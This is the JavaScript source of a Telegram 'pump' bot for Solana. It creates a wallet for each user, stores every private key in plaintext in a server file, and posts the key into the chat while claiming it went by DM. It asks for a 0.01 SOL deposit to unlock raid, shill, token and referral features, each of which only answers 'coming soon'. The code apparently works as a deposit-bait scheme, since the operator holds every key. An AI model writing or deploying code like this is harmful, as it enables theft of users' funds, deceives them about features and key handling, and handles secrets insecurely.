require("dotenv").config(); // Load .env at the start

const TelegramBot = require("node-telegram-bot-api");
const { Keypair, Connection, clusterApiUrl, PublicKey } = require("@solana/web3.js");
const bs58 = require("bs58");
const fs = require("fs");

// Load environment variables safely
const BOT_TOKEN = process.env.BOT_TOKEN;
const SOLANA_RPC_URL = process.env.SOLANA_RPC_URL || clusterApiUrl("mainnet-beta");

if (!BOT_TOKEN) {
    console.error("❌ BOT_TOKEN is missing in the .env file!");
    process.exit(1);
}

// Initialize Telegram bot with long polling
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Load user data
const USERS_FILE = "users.json";
let users = fs.existsSync(USERS_FILE) ? JSON.parse(fs.readFileSync(USERS_FILE)) : {};

// Save user data function
const saveUsers = () => fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));

// Generate a Solana wallet
const generateSolanaWallet = () => {
    const keypair = Keypair.generate();
    return {
        address: keypair.publicKey.toBase58(),
        privateKey: bs58.encode(keypair.secretKey),
    };
};

// Start command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username || msg.from.first_name;

    if (!users[chatId]) {
        const wallet = generateSolanaWallet();
        users[chatId] = { username, solAddress: wallet.address, privateKey: wallet.privateKey, balance: 0 };
        saveUsers();

        bot.sendMessage(chatId, `🎉 Welcome, ${username}!\nYour Solana wallet has been created.\n\n` +
            `🔹 **Solana Address:** \`${wallet.address}\`\n` +
            `🔒 **Private Key:** Sent in DM (NEVER SHARE IT!)`, { parse_mode: "Markdown" });

        bot.sendMessage(chatId, `🔑 Your private key: \`${wallet.privateKey}\` (Keep it safe!)`, { parse_mode: "Markdown" });
    } else {
        bot.sendMessage(chatId, `👋 Welcome back, ${username}!\nYour wallet is ready.`);
    }
});

// Check wallet balance
bot.onText(/\/wallet/, async (msg) => {
    const chatId = msg.chat.id;
    if (!users[chatId]) return bot.sendMessage(chatId, "❌ You need to /start first.");

    const connection = new Connection(SOLANA_RPC_URL, "confirmed");
    try {
        const balance = await connection.getBalance(new PublicKey(users[chatId].solAddress));
        const solBalance = balance / 1e9;
        users[chatId].balance = solBalance;
        saveUsers();

        bot.sendMessage(chatId, `🏦 **Your Wallet**\n\n` +
            `🔹 **Address:** \`${users[chatId].solAddress}\`\n` +
            `💰 **Balance:** ${solBalance.toFixed(4)} SOL\n\n` +
            "⚡ Fund your wallet to unlock features!", { parse_mode: "Markdown" });
    } catch (error) {
        bot.sendMessage(chatId, "❌ Error fetching balance. Please try again later.");
        console.error("Balance check error:", error);
    }
});

// Deposit instructions
bot.onText(/\/deposit/, (msg) => {
    const chatId = msg.chat.id;
    if (!users[chatId]) return bot.sendMessage(chatId, "❌ You need to /start first.");

    bot.sendMessage(chatId, `🔹 Send at least **0.01 SOL** to this address to unlock features:\n\n` +
        `\`${users[chatId].solAddress}\`\n\n` +
        "🚀 After deposit, use /check_balance to refresh.", { parse_mode: "Markdown" });
});

// Check Solana balance
bot.onText(/\/check_balance/, async (msg) => {
    const chatId = msg.chat.id;
    if (!users[chatId]) return bot.sendMessage(chatId, "❌ You need to /start first.");

    const connection = new Connection(SOLANA_RPC_URL, "confirmed");
    try {
        const balance = await connection.getBalance(new PublicKey(users[chatId].solAddress));
        const solBalance = balance / 1e9;
        users[chatId].balance = solBalance;
        saveUsers();

        if (solBalance >= 0.01) {
            bot.sendMessage(chatId, `✅ Deposit received! Balance: ${solBalance.toFixed(4)} SOL\n\n` +
                "🎉 You now have access to all features!");
        } else {
            bot.sendMessage(chatId, `⚠️ Deposit not received or insufficient (Balance: ${solBalance.toFixed(4)} SOL)\n\n` +
                "🔹 Send at least **0.01 SOL** to unlock features.");
        }
    } catch (error) {
        bot.sendMessage(chatId, "❌ Error checking balance.");
        console.error("Balance check error:", error);
    }
});

// Feature Commands (Locked until deposit)
["/raid", "/shill", "/token", "/refer"].forEach((command) => {
    bot.onText(new RegExp(command), (msg) => {
        const chatId = msg.chat.id;
        if (!users[chatId] || users[chatId].balance < 0.01) {
            return bot.sendMessage(chatId, "❌ You need at least **0.01 SOL** to use this feature!");
        }
        bot.sendMessage(chatId, `🚀 ${command.replace("/", "")} feature is coming soon!`);
    });
});

// Help command
bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id,
        "**Vortex Pump Bot Commands**\n\n" +
        "🚀 /start - Create a Solana wallet\n" +
        "🏦 /wallet - Check your wallet balance\n" +
        "🎁 /refer - Get your referral link\n" +
        "🔥 /shill - Activate Shill Mode\n" +
        "💎 /raid - Activate Raider Mode\n" +
        "📊 /token - Token-related info\n" +
        "⚙️ /settings - Customize your bot settings\n" +
        "❓ /support - Get help or contact admin",
        { parse_mode: "Markdown" }
    );
});

console.log("🤖 Bot is running...");
